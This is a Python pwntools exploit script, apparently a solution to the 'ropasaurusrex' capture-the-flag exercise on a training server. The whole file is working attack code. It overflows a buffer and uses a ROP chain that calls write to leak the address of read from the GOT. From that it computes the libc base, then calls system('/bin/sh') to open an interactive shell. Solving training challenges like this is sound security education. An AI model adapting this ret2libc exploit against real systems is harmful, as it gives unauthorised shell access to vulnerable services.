#!/usr/bin/env python3

import sys
from pwn import *
from pwn import p32, u32

# patchelf --replace-needed libc-2.31.so ./libc-2.31.so ropasaurusrex

if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 2014)
else:
    p = process("./ropasaurusrex")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x0804926b
    """)

elf = ELF("./ropasaurusrex", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)

got_read = elf.got["read"]
plt_write = elf.plt["write"]

chain = p32(plt_write)
# gadget used to clean the params put in stack before calling the main
# not necessary but it is better to do it
# pop esi; pop edi; pop ebp; ret;
# ropper --nocolor -f ropasaurusrex > gadgets.txt
chain += p32(0x080484b6)
chain += p32(1)
chain += p32(got_read)
chain += p32(4)
chain += p32(0x0804841d)

p.sendline(b"A" * 140 + chain)

libc_read = u32(p.recvn(4))

libc.address = libc_read - libc.symbols["read"]

log.info("leaked address: %x", libc_read)
log.info("libc address %x", libc.address)

# libc address must terminate with three zeros

binsh = next(libc.search(b"/bin/sh\0"))

chain = p32(libc.symbols["system"])
chain += p32(0x41414141)  # fake eip, not used
chain += p32(binsh)

p.sendline(b"A" * 140 + chain)

p.interactive()
